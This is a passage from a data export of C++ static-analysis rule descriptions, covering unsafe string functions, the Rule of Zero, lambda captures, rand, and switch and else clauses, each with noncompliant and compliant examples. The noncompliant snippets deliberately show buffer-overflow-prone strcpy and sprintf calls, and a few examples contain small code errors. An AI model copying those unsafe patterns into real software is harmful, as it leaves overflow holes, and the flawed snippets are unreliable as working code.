<code>snprintf()</code>, which allows you to define the maximum number of characters to be written to the buffer. However, since
<code>strlcpy()</code> and <code>strlcat()</code> are part of the BSD library, they might not be available, in which case <code>strncpy()</code> and
<code>strncat()</code> should be used instead, but be aware that they don't guarantee the string will be null-terminated.</p>
<p>This rule logs an issue when encountering the following insecure functions: <code>strcpy()</code>, <code>strcat()</code> and
<code>sprintf()</code></p>
<h2>Noncompliant Code Example</h2>
<pre>
sprintf(str, ""%s"", message);   // Noncompliant
strcpy(str, message); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
snprintf(str, sizeof(str), ""%s"", message);
strlcpy(str, message, sizeof(str));

strncpy(str, message, sizeof(str) -1); // Leave room for null
str[sizeof(str) - 1] = '\0'; // Make sure the string is null-terminated
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/120"">MITRE, CWE-120</a> - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/676"">MITRE, CWE-676</a> - Use of Potentially Dangerous Function </li>
  <li> OWASP Top 10 2017 Category A9 - Using Components with Known Vulnerabilities </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/QwY"">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation
  </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
</ul>","Insecure functions ""strcpy"", ""strcat"" and ""sprintf"" should not be used",[],CRITICAL,"['cert', 'cwe', 'owasp-a9', 'sans-top25-risky']",VULNERABILITY
2018-12-21T09:50:14+0100,"<p>Most classes should not directly handle resources, but instead use members that perform resource handling for them:</p>
<p>- For memory, it can be <code>std::unique_ptr</code>, <code>std::shared_ptr</code>, <code>std::vector</code>...</p>
<p>- For files, it can be <code>std::ofstream</code>, <code>std::ifstream</code>...</p>
<p>- ...</p>
<p>Classes that avoid directly handling resources don't need to define any of the special member functions required to properly handle resources:
destructor, copy constructor, move constructor, copy-assignment operator, move-assignment operator. That's because the versions of those functions
provided by the compiler do the right thing automatically, which is especially useful because writing these functions correctly is typically tricky
and error-prone.</p>
<p>Omitting all of these functions from a class is known as the Rule of Zero because no special function should be defined.</p>
<p>In some cases, this rule take a slightly different shape, while respecting the fact that no definition of those functions will be provided:</p>
<p>- For the base class of a polymorphic hierarchy, the destructor should be declared as <code>public</code> and <code>virtual</code>, and defaulted
(<code>=default</code>). The copy-constructor and copy-assignment operator should be deleted. (If you want to copy classes in a polymorphic hierarchy,
use the <code>clone</code> idiom.) The move operation will be automatically deleted by the compiler. </p>
<p>- For other kinds of base classes, the destructor should be <code>protected</code> and non-<code>virtual</code>, and defaulted
(<code>=default</code>).</p>
<h2>Noncompliant Code Example</h2>
<pre>
class FooPointer { // Non compliant. The code is correct (it follows the rule of 5), but unnecessarily complex
  Foo* pFoo;
public:
  FooPointer(int initValue) {
    pFoo = new Foo(initValue);
  }
  ~FooPointer() {
    delete pFoo;
  }
  FooPointer(FooPointer const &amp;fp) = delete;
  FooPointer const &amp; operator=(FooPointer const &amp;fp) = delete;
  FooPointer(FooPointer &amp;&amp;fp) noexcept {
    pFoo = fp.pFoo;
    fp.pFoo = nullptr;
  }
  FooPointer const &amp; operator=(FooPointer &amp;&amp;fp) {
    FooPointer temp(std::move(fp));
    std::swap(temp.pFoo, pFoo);
    return *this;
  }
};
</pre>
<h2>Compliant Solution</h2>
<pre>
class FooPointer { // Compliant, std::unique_ptr is use to handle memory management
  unique_ptr&lt;Foo&gt; pFoo;
public:
  FooPointer(int initValue) : pFoo(std::make_unique&lt;Foo&gt;(initValue) {}
};

</pre>
<p>A polymorphic base class can look like this:</p>
<pre>
class Base { // Compliant, the virtual destructor is defaulted
public:
  virtual ~Base() = default;
  Base(Base const &amp;) = delete;
  Base &amp;operator=(Base const &amp;) = delete;
};
</pre>
<h2>Exceptions</h2>
<p>Empty destructors are treated as though they were defaulted.</p>
<h2>See</h2>
<ul>
  <li> <a href='/coding_rules#rule_key=cpp%3AS3624'>S3624</a> </li>
  <li> <a href='/coding_rules#rule_key=cpp%3AS1235'>S1235</a> </li>
</ul>",cpp:S4963,cpp,C++,"<p>Most classes should not directly handle resources, but instead use members that perform resource handling for them:</p>
<p>- For memory, it can be <code>std::unique_ptr</code>, <code>std::shared_ptr</code>, <code>std::vector</code>...</p>
<p>- For files, it can be <code>std::ofstream</code>, <code>std::ifstream</code>...</p>
<p>- ...</p>
<p>Classes that avoid directly handling resources don't need to define any of the special member functions required to properly handle resources:
destructor, copy constructor, move constructor, copy-assignment operator, move-assignment operator. That's because the versions of those functions
provided by the compiler do the right thing automatically, which is especially useful because writing these functions correctly is typically tricky
and error-prone.</p>
<p>Omitting all of these functions from a class is known as the Rule of Zero because no special function should be defined.</p>
<p>In some cases, this rule take a slightly different shape, while respecting the fact that no definition of those functions will be provided:</p>
<p>- For the base class of a polymorphic hierarchy, the destructor should be declared as <code>public</code> and <code>virtual</code>, and defaulted
(<code>=default</code>). The copy-constructor and copy-assignment operator should be deleted. (If you want to copy classes in a polymorphic hierarchy,
use the <code>clone</code> idiom.) The move operation will be automatically deleted by the compiler. </p>
<p>- For other kinds of base classes, the destructor should be <code>protected</code> and non-<code>virtual</code>, and defaulted
(<code>=default</code>).</p>
<h2>Noncompliant Code Example</h2>
<pre>
class FooPointer { // Non compliant. The code is correct (it follows the rule of 5), but unnecessarily complex
  Foo* pFoo;
public:
  FooPointer(int initValue) {
    pFoo = new Foo(initValue);
  }
  ~FooPointer() {
    delete pFoo;
  }
  FooPointer(FooPointer const &amp;fp) = delete;
  FooPointer const &amp; operator=(FooPointer const &amp;fp) = delete;
  FooPointer(FooPointer &amp;&amp;fp) noexcept {
    pFoo = fp.pFoo;
    fp.pFoo = nullptr;
  }
  FooPointer const &amp; operator=(FooPointer &amp;&amp;fp) {
    FooPointer temp(std::move(fp));
    std::swap(temp.pFoo, pFoo);
    return *this;
  }
};
</pre>
<h2>Compliant Solution</h2>
<pre>
class FooPointer { // Compliant, std::unique_ptr is use to handle memory management
  unique_ptr&lt;Foo&gt; pFoo;
public:
  FooPointer(int initValue) : pFoo(std::make_unique&lt;Foo&gt;(initValue) {}
};

</pre>
<p>A polymorphic base class can look like this:</p>
<pre>
class Base { // Compliant, the virtual destructor is defaulted
public:
  virtual ~Base() = default;
  Base(Base const &amp;) = delete;
  Base &amp;operator=(Base const &amp;) = delete;
};
</pre>
<h2>Exceptions</h2>
<p>Empty destructors are treated as though they were defaulted.</p>
<h2>See</h2>
<ul>
  <li> {rule:cpp:S3624} </li>
  <li> {rule:cpp:S1235} </li>
</ul>","The ""Rule-of-Zero"" should be followed",[],CRITICAL,"['cert', 'leak']",CODE_SMELL
2018-12-21T09:50:14+0100,"<p>A lambda can only capture local variables. When a lambda is defined within a member function, you may believe that you are capturing a member
variable of the current class, but in fact, what you are capturing is <code>this</code>. This may be very surprising, and lead to bugs if the lambda
is then used after the current object has been destroyed.</p>
<p>Therefore, it's better to be explicit about exactly what is captured as soon as <code>this</code> is captured.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class A {
  int i;
  void f(int j) {
    auto l = [=](int k) { return i+j+k;}; // Noncompliant, someone reading the code might believe that i is captured by copy
  }
};
</pre>
<h2>Compliant Solution</h2>
<pre>
class A {
  int i;
  void f(int j) {
    auto l = [this, j](int k) { return i+j+k;}; // It is now clearer that i is not directly captured
    // auto l = [i, j](int k) { return i+j+k;}; // Would not compile
  }
};
</pre>
<h2>See</h2>
<p> * <a
href=""https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#f54-if-you-capture-this-capture-all-variables-explicitly-no-default-capture"">C++
core guidelines F.54</a> If you capture <code>this</code>, capture all variables explicitly (no default capture)</p>",cpp:S5019,cpp,C++,"<p>A lambda can only capture local variables. When a lambda is defined within a member function, you may believe that you are capturing a member
variable of the current class, but in fact, what you are capturing is <code>this</code>. This may be very surprising, and lead to bugs if the lambda
is then used after the current object has been destroyed.</p>
<p>Therefore, it's better to be explicit about exactly what is captured as soon as <code>this</code> is captured.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class A {
  int i;
  void f(int j) {
    auto l = [=](int k) { return i+j+k;}; // Noncompliant, someone reading the code might believe that i is captured by copy
  }
};
</pre>
<h2>Compliant Solution</h2>
<pre>
class A {
  int i;
  void f(int j) {
    auto l = [this, j](int k) { return i+j+k;}; // It is now clearer that i is not directly captured
    // auto l = [i, j](int k) { return i+j+k;}; // Would not compile
  }
};
</pre>
<h2>See</h2>
<p> * <a
href=""https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#f54-if-you-capture-this-capture-all-variables-explicitly-no-default-capture"">C++
core guidelines F.54</a> If you capture <code>this</code>, capture all variables explicitly (no default capture)</p>","Lambdas that capture ""this"" should capture everything explicitly",[],CRITICAL,"['confusing', 'cpp11', 'pitfall']",CODE_SMELL
2018-12-21T09:50:14+0100,"<p>The use of <code>srand</code> together with <code>rand</code> to seed the random number generator and then generate numbers usually produces
low-quality randomness. Further, <code>rand</code> can only provide a number between <code>0</code> and <code>RAND_MAX</code>, and it is left to the
caller to transform the result into what is actually required (E.G. a <code>float</code> between 0 and 1 for a random percentage, an <code>int</code>
between 1 and 6 for a dice game, ...), and that transformation might introduce additional biases.</p>
<p>C++11 introduced the <code>&lt;random&gt;</code> library, which contains several high quality random value generators as well as statistical
distributions you can use to put the results in the form you need. Those mechanisms should be used instead of <code>rand</code> and
<code>srand</code>.</p>
<p>Additionally, <code>std::random_shuffle</code>, which is deprecated in C++14 and removed in C++17, uses <code>rand</code> and should be replaced by
<code>std::shuffle</code>, which uses the random number generators provided by <code>&lt;random&gt;</code>. </p>
<h2>Noncompliant Code Example</h2>
<pre>
#include &lt;stdlib.h&gt;
#include &lt;algorithm&gt;
// ...

void f() {
  srand(time(nullptr)); // Noncompliant
  vector&lt;int&gt; v;
  int size = rand() % 1000 + 1000; // Noncompliant, note that this way of coercing the result introduces extra bias
  for (auto i = 0; i &lt; size; ++i) {
    v.push_back(i);
  }
  random_shuffle(v.begin(), v.end()); // Noncompliant
  for (auto i : v) { cout &lt;&lt; i &lt;&lt; "" ""; }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#include &lt;algorithm&gt;
#include &lt;random&gt;
// ...

void f() {
  random_device rd;  // Will be used to obtain a seed for the random number engine
  mt19937 gen(rd()); // Standard mersenne_twister_engine seeded with rd()
  uniform_int_distribution&lt;&gt; dis(1000, 1999); // Same distribution as before, but explicit and without bias
  vector&lt;int&gt; v;
  for (auto i = 0; i &lt; dis(gen); ++i) {
    v.push_back(i);
  }
  shuffle(v.begin(), v.end(), gen);
  for (auto i : v) { cout &lt;&lt; i &lt;&lt; "" ""; }
}
</pre>",cpp:S5020,cpp,C++,"<p>The use of <code>srand</code> together with <code>rand</code> to seed the random number generator and then generate numbers usually produces
low-quality randomness. Further, <code>rand</code> can only provide a number between <code>0</code> and <code>RAND_MAX</code>, and it is left to the
caller to transform the result into what is actually required (E.G. a <code>float</code> between 0 and 1 for a random percentage, an <code>int</code>
between 1 and 6 for a dice game, ...), and that transformation might introduce additional biases.</p>
<p>C++11 introduced the <code>&lt;random&gt;</code> library, which contains several high quality random value generators as well as statistical
distributions you can use to put the results in the form you need. Those mechanisms should be used instead of <code>rand</code> and
<code>srand</code>.</p>
<p>Additionally, <code>std::random_shuffle</code>, which is deprecated in C++14 and removed in C++17, uses <code>rand</code> and should be replaced by
<code>std::shuffle</code>, which uses the random number generators provided by <code>&lt;random&gt;</code>. </p>
<h2>Noncompliant Code Example</h2>
<pre>
#include &lt;stdlib.h&gt;
#include &lt;algorithm&gt;
// ...

void f() {
  srand(time(nullptr)); // Noncompliant
  vector&lt;int&gt; v;
  int size = rand() % 1000 + 1000; // Noncompliant, note that this way of coercing the result introduces extra bias
  for (auto i = 0; i &lt; size; ++i) {
    v.push_back(i);
  }
  random_shuffle(v.begin(), v.end()); // Noncompliant
  for (auto i : v) { cout &lt;&lt; i &lt;&lt; "" ""; }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#include &lt;algorithm&gt;
#include &lt;random&gt;
// ...

void f() {
  random_device rd;  // Will be used to obtain a seed for the random number engine
  mt19937 gen(rd()); // Standard mersenne_twister_engine seeded with rd()
  uniform_int_distribution&lt;&gt; dis(1000, 1999); // Same distribution as before, but explicit and without bias
  vector&lt;int&gt; v;
  for (auto i = 0; i &lt; dis(gen); ++i) {
    v.push_back(i);
  }
  shuffle(v.begin(), v.end(), gen);
  for (auto i : v) { cout &lt;&lt; i &lt;&lt; "" ""; }
}
</pre>","""srand"", ""rand"" and ""random_shuffle"" should not be used",[],BLOCKER,"['cpp11', 'user-experience']",BUG
2017-07-28T12:37:58+0200,"<p>In the absence of enclosing curly braces, the line immediately after a conditional is the one that is conditionally executed. By both convention
and good practice, such lines are indented. In the absence of both curly braces and indentation the intent of the original programmer is entirely
unclear and perhaps not actually what is executed. Additionally, such code is highly likely to be confusing to maintainers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition)  // Noncompliant
doTheThing();

doTheOtherThing();
somethingElseEntirely();

foo();
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition)
  doTheThing();

doTheOtherThing();
somethingElseEntirely();

foo();
</pre>",cpp:S3973,cpp,C++,"<p>In the absence of enclosing curly braces, the line immediately after a conditional is the one that is conditionally executed. By both convention
and good practice, such lines are indented. In the absence of both curly braces and indentation the intent of the original programmer is entirely
unclear and perhaps not actually what is executed. Additionally, such code is highly likely to be confusing to maintainers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition)  // Noncompliant
doTheThing();

doTheOtherThing();
somethingElseEntirely();

foo();
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition)
  doTheThing();

doTheOtherThing();
somethingElseEntirely();

foo();
</pre>",A conditionally executed single line should be denoted by indentation,[],CRITICAL,"['confusing', 'suspicious']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>The requirement for a final <code>default</code> clause is defensive programming. The clause should either take appropriate action, or contain a
suitable comment as to why no action is taken. When the <code>switch</code> covers all current values of an <code>enum</code> - and especially when it
doesn't - a <code>default</code> case should still be used because there is no guarantee that the <code>enum</code> won't be extended.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (param) { // Noncompliant - default clause is missing
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (param) {
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
  default:
    doDefault();
    break;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used. </li>
  <li> MISRA C:2004, 15.3 - The final clause of a switch statement shall be the default clause </li>
  <li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement. </li>
  <li> MISRA C++:2008, 6-4-6 - The final clause of a switch statement shall be the default-clause </li>
  <li> MISRA C:2012, 16.1 - All switch statements shall be well-formed </li>
  <li> MISRA C:2012, 16.4 - Every <em>switch</em> statement shall have a <em>default</em> label </li>
  <li> MISRA C:2012, 16.5 - A <em>default</em> label shall appear as either the first or the last <em>switch label</em> of a <em>switch</em> statement
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/478.html"">MITRE, CWE-478</a> - Missing Default Case in Switch Statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/YgE"">CERT, MSC01-C.</a> - Strive for logical completeness </li>
</ul>
<h3>See also</h3>
<ul>
  <li> <a href='/coding_rules#rule_key=cpp%3AS3562'>S3562</a> </li>
</ul>",cpp:SwitchWithoutDefault,cpp,C++,"<p>The requirement for a final <code>default</code> clause is defensive programming. The clause should either take appropriate action, or contain a
suitable comment as to why no action is taken. When the <code>switch</code> covers all current values of an <code>enum</code> - and especially when it
doesn't - a <code>default</code> case should still be used because there is no guarantee that the <code>enum</code> won't be extended.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (param) { // Noncompliant - default clause is missing
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (param) {
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
  default:
    doDefault();
    break;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used. </li>
  <li> MISRA C:2004, 15.3 - The final clause of a switch statement shall be the default clause </li>
  <li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement. </li>
  <li> MISRA C++:2008, 6-4-6 - The final clause of a switch statement shall be the default-clause </li>
  <li> MISRA C:2012, 16.1 - All switch statements shall be well-formed </li>
  <li> MISRA C:2012, 16.4 - Every <em>switch</em> statement shall have a <em>default</em> label </li>
  <li> MISRA C:2012, 16.5 - A <em>default</em> label shall appear as either the first or the last <em>switch label</em> of a <em>switch</em> statement
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/478.html"">MITRE, CWE-478</a> - Missing Default Case in Switch Statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/YgE"">CERT, MSC01-C.</a> - Strive for logical completeness </li>
</ul>
<h3>See also</h3>
<ul>
  <li> {rule:cpp:S3562} </li>
</ul>","""switch"" statements should have ""default"" clauses",[],CRITICAL,"['cert', 'cwe', 'misra']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>This rule applies whenever an <code>if</code> statement is followed by one or more <code>else if</code> statements; the final <code>else if</code>
should be followed by an <code>else</code> statement.</p>
<p>The requirement for a final <code>else</code> statement is defensive programming.</p>
<p>The <code>else</code> statement should either take appropriate action or contain a suitable comment as to why no action is taken. This is
consistent with the requirement to have a final <code>default</code> clause in a <code>switch</code> statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x == 0) {
  doSomething();
} else if (x == 1) {
  doSomethingElse();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x == 0) {
  doSomething();
} else if (x == 1) {
  doSomethingElse();
} else {
  error();
}
</pre>
<h2>Exceptions</h2>
<p>When all branches of an <code>if</code>-<code>else if</code> end with <code>return</code>, <code>break</code> or <code>throw</code>, the code that
comes after the <code>if</code> implicitly behaves as if it was in an <code>else</code> clause. This rule will therefore ignore that case.</p>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.10 - All if...else if constructs shall be terminated with an else clause. </li>
  <li> MISRA C++:2008, 6-4-2 - All if...else if constructs shall be terminated with an else clause. </li>
  <li> MISRA C:2012, 15.7 - All if...else if constructs shall be terminated with an else statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/YgE"">CERT, MSC01-C.</a> - Strive for logical completeness </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/PQHRAw"">CERT, MSC57-J.</a> - Strive for logical completeness </li>
</ul>",cpp:ElseIfWithoutElse,cpp,C++,"<p>This rule applies whenever an <code>if</code> statement is followed by one or more <code>else if</code> statements; the final <code>else if</code>
should be followed by an <code>else</code> statement.</p>
<p>The requirement for a final <code>else</code> statement is defensive programming.</p>
<p>The <code>else</code> statement should either take appropriate action or contain a suitable comment as to why no action is taken. This is
consistent with the requirement to have a final <code>default</code> clause in a <code>switch</code> statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x == 0) {
  doSomething();
} else if (x == 1) {
  doSomethingElse();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x == 0) {
  doSomething();
} else if (x == 1) {
  doSomethingElse();
} else {
  error();
}
</pre>
<h2>Exceptions</h2>
<p>When all branches of an <code>if</code>-<code>else if</code> end with <code>return</code>, <code>break</code> or <code>throw</code>, the code that
comes after the <code>if</code> implicitly behaves as if it was in an <code>else</code> clause. This rule will therefore ignore that case.</p>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.10 - All if...else if constructs shall be terminated with an else clause. </li>
  <li> MISRA C++:2008, 6-4-2 - All if...else if constructs shall be terminated with an else clause. </li>
  <li> MISRA C:2012, 15.7 - All if...else if constructs shall be terminated with an else statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/YgE"">CERT, MSC01-C.</a> - Strive for logical completeness </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/PQHRAw"">CERT, MSC57-J.</a> - Strive for logical completeness </li>
</ul>","""if ... else if"" constructs should end with ""else"" clauses",[],CRITICAL,"['cert', 'misra']",CODE_SMELL
2018-12-19T08:44:15+0100,"<p><code>void*</code> is a pointer to memory of unknown type, and therefore works outside of the safety net provided by the type system. While it can
be useful in a function body to interface with external code, there is no good reason to step out of the robust C++ type system when defining a
function, either for the function parameters, or for the function return type.</p>
<p>If you want to work with raw memory buffer, use <code>unsigned char *</code> (or <code>byte *</code> if your compiler supports it).</p>
<p>If you want to work with different types of data, define a function template and use typed pointers, instead of <code>void *</code>.</p>
<p>If you want to provide to users of an API an opaque type, declare a type and don't provide its definition (like with <code>FILE*</code>).</p>
<h2>Noncompliant Code Example</h2>
<pre>
void saveBuffer(void *buffer, size_t size); // Noncompliant
void duplicate(void* destination, size_t count, void *source, size_t size); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
void saveBuffer(unsigned char *buffer, size_t size);
template&lt;class T&gt;
void duplicate(T* destination, size_t count, T *source);
</pre>",cpp:S5008,cpp,C++,"<p><code>void*</code> is a pointer to memory of unknown type, and therefore works outside of the safety net provided by the type system. While it can
be useful in a function body to interface with external code, there is no good reason to step out of the robust C++ type system when defining a
function, either for the function parameters, or for the function return type.</p>
<p>If you want to work with raw memory buffer, use <code>unsigned char *</code> (or <code>byte *</code> if your compiler supports it).</p>
<p>If you want to work with different types of data, define a function template and use typed pointers, instead of <code>void *</code>.</p>
<p>If you want to provide to users of an API an opaque type, declare a type and don't provide its definition (like with <code>FILE*</code>).</p>
<h2>Noncompliant Code Example</h2>
<pre>
void saveBuffer(void *buffer, size_t size); // Noncompliant
void duplicate(void* destination, size_t count, void *source, size_t size); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
void saveBuffer(unsigned char *buffer, size_t size);
template&lt;class T&gt;
void duplicate(T* destination, size_t count, T *source);
</pre>","""void *"" should not be used in function parameters or return type",[],CRITICAL,['misra'],CODE_SMELL
2018-02-14T07:15:15+0100,"<p>Control characters aren't visible to maintainers, so they should be escaped.</p>
<h2>Noncompliant Code Example</h2>
<pre>
const char* foo = ""A	B"";  // Noncompliant, contains a tabulation
</pre>
<h2>Compliant Solution</h2>
<pre>
const char* foo = ""A\tB"";  // Compliant, use escaped value
</pre>
<h2>Exceptions</h2>
<p>Raw string literals has no escape character mechanism.</p>",cpp:S2479,cpp,C++,"<p>Control characters aren't visible to maintainers, so they should be escaped.</p>
<h2>Noncompliant Code Example</h2>
<pre>
const char* foo = ""A	B"";  // Noncompliant, contains a tabulation
</pre>
<h2>Compliant Solution</h2>
<pre>
const char* foo = ""A\tB"";  // Compliant, use escaped value
</pre>
<h2>Exceptions</h2>
<p>Raw string literals has no escape character mechanism.</p>",Control characters should not be used in literals,[],CRITICAL,['pitfall'],CODE_SMELL
2015-02-03T08:39:42+0100,"<p>Line-splicing occurs when the \ character is immediately followed by a new-line character. If the source line containing a <code>//</code> comment
ends with a '\', the next line becomes part of the comment. This may result in unintentional removal of code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void f ( void )
{
  int x = 0; // comment \
  if (x)
  {
    ++x; /* This is always executed */
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2012, 3.2 - Line-splicing shall not be used in // comments </li>
</ul>",cpp:S2323,cpp,C++,"<p>Line-splicing occurs when the \ character is immediately followed by a new-line character. If the source line containing a <code>//</code> comment
ends with a '\', the next line becomes part of the comment. This may result in unintentional removal of code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void f ( void )
{
  int x = 0; // comment \
  if (x)
  {
    ++x; /* This is always executed */
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2012, 3.2 - Line-splicing shall not be used in // comments </li>
</ul>","Line-splicing should not be used in ""//"" comments",[],CRITICAL,['misra'],BUG
2018-12-19T08:44:15+0100,"<p>If you use <code>std::unique_ptr&lt;T&gt; const &amp;</code> for a function parameter type, it means that the function will not be able to alter
the ownership of the pointed-to object by the <code>unique_ptr</code>:</p>
<ul>
  <li> It cannot acquire ownership of the pointed-to object (this would require a parameter of type <code>std::unique_ptr&lt;T&gt;</code>) </li>
  <li> It cannot transfer the object ownership to someone else (this would require a <code>std::unique_ptr&lt;T&gt; &amp;</code>). </li>
</ul>
<p>That means the function can only observe the pointed-to object, and in this case passing a <code>T*</code> (if the <code>unique_ptr</code> can be
null) or a <code>T&amp;</code> (if it cannot) provides the same features, while also allowing the function to work with objects that are not handled
by a <code>unique_ptr</code> (E.G. objects on the stack, in a <code>vector</code>, or in another kind of smart pointer), thus making the function more
general-purpose.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using namespace std;
void draw(unique_ptr&lt;Shape&gt; const &amp;shape); // Noncompliant

void drawAll(vector&lt;unique_ptr&lt;Shape&gt;&gt; v)
{
  for (auto &amp;shape : v) {
      if (shape) {
        draw(shape);
      }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using namespace std;
void draw(Shape const &amp;shape); // Compliant

void drawAll(vector&lt;unique_ptr&lt;Shape&gt;&gt; v)
{
  for (auto &amp;shape : v) {
      if (shape) {
        draw(*shape);
      }
  }
}
</pre>",cpp:S4998,cpp,C++,"<p>If you use <code>std::unique_ptr&lt;T&gt; const &amp;</code> for a function parameter type, it means that the function will not be able to alter
the ownership of the pointed-to object by the <code>unique_ptr</code>:</p>
<ul>
  <li> It cannot acquire ownership of the pointed-to object (this would require a parameter of type <code>std::unique_ptr&lt;T&gt;</code>) </li>
  <li> It cannot transfer the object ownership to someone else (this would require a <code>std::unique_ptr&lt;T&gt; &amp;</code>). </li>
</ul>
<p>That means the function can only observe the pointed-to object, and in this case passing a <code>T*</code> (if the <code>unique_ptr</code> can be
null) or a <code>T&amp;</code> (if it cannot) provides the same features, while also allowing the function to work with objects that are not handled
by a <code>unique_ptr</code> (E.G. objects on the stack, in a <code>vector</code>, or in another kind of smart pointer), thus making the function more
general-purpose.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using namespace std;
void draw(unique_ptr&lt;Shape&gt; const &amp;shape); // Noncompliant

void drawAll(vector&lt;unique_ptr&lt;Shape&gt;&gt; v)
{
  for (auto &amp;shape : v) {
      if (shape) {
        draw(shape);
      }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using namespace std;
void draw(Shape const &amp;shape); // Compliant

void drawAll(vector&lt;unique_ptr&lt;Shape&gt;&gt; v)
{
  for (auto &amp;shape : v) {
      if (shape) {
        draw(*shape);
      }
  }
}
</pre>","Function parameters should not be of type ""std::unique_ptr<T> const &""",[],MAJOR,"['bad-practice', 'clumsy', 'cpp11', 'design']",CODE_SMELL
2018-12-19T08:44:15+0100,"<p><code>std::auto_ptr</code> was a pre-C++11 attempt to do what <code>std::unique_ptr</code> now does. Unfortunately, the move semantics needed to
make it work properly weren't in place, so copying a <code>std::auto_ptr</code> has the very surprising behavior of invalidating the source of the
copy.</p>
<p>That problem has been fixed with <code>std::unique_ptr</code>, so <code>std::auto_ptr</code> has been deprecated in C++11 and removed in C++17.</p>
<p>If your compiler allows it, you should replace all use of <code>std::auto_ptr</code> with <code>std::unique_ptr</code>. Otherwise, define your own
(non-copyable) smart pointer.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using namespace std;

void draw(auto_ptr&lt;Shape&gt; p) { cout &lt;&lt; s-&gt;x() &lt;&lt; "", "" &lt;&lt; s.y() &lt;&lt; endl;} // Noncompliant

void f()
{
    std::auto_ptr&lt;Shape&gt; s = createShape(); // Noncompliant
    draw(s); // This call invalidates s
    draw(s); // This call will crash, because s is null
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using namespace std;

void draw(unique_ptr&lt;Shape&gt; p) { cout &lt;&lt; s-&gt;x() &lt;&lt; "", "" &lt;&lt; s.y() &lt;&lt; endl;} // Compliant

void f()
{
    std::unique_ptr&lt;Shape&gt; s = createShape();
    // draw(s); // Would not compile
    draw(move(s)); // Will compile, and the user knows s has been invalidated
}
</pre>",cpp:S4997,cpp,C++,"<p><code>std::auto_ptr</code> was a pre-C++11 attempt to do what <code>std::unique_ptr</code> now does. Unfortunately, the move semantics needed to
make it work properly weren't in place, so copying a <code>std::auto_ptr</code> has the very surprising behavior of invalidating the source of the
copy.</p>
<p>That problem has been fixed with <code>std::unique_ptr</code>, so <code>std::auto_ptr</code> has been deprecated in C++11 and removed in C++17.</p>
<p>If your compiler allows it, you should replace all use of <code>std::auto_ptr</code> with <code>std::unique_ptr</code>. Otherwise, define your own
(non-copyable) smart pointer.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using namespace std;

void draw(auto_ptr&lt;Shape&gt; p) { cout &lt;&lt; s-&gt;x() &lt;&lt; "", "" &lt;&lt; s.y() &lt;&lt; endl;} // Noncompliant

void f()
{
    std::auto_ptr&lt;Shape&gt; s = createShape(); // Noncompliant
    draw(s); // This call invalidates s
    draw(s); // This call will crash, because s is null
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using namespace std;

void draw(unique_ptr&lt;Shape&gt; p) { cout &lt;&lt; s-&gt;x() &lt;&lt; "", "" &lt;&lt; s.y() &lt;&lt; endl;} // Compliant

void f()
{
    std::unique_ptr&lt;Shape&gt; s = createShape();
    // draw(s); // Would not compile
    draw(move(s)); // Will compile, and the user knows s has been invalidated
}
</pre>","""std::auto_ptr"" should not be used",[],BLOCKER,"['cpp11', 'suspicious']",BUG
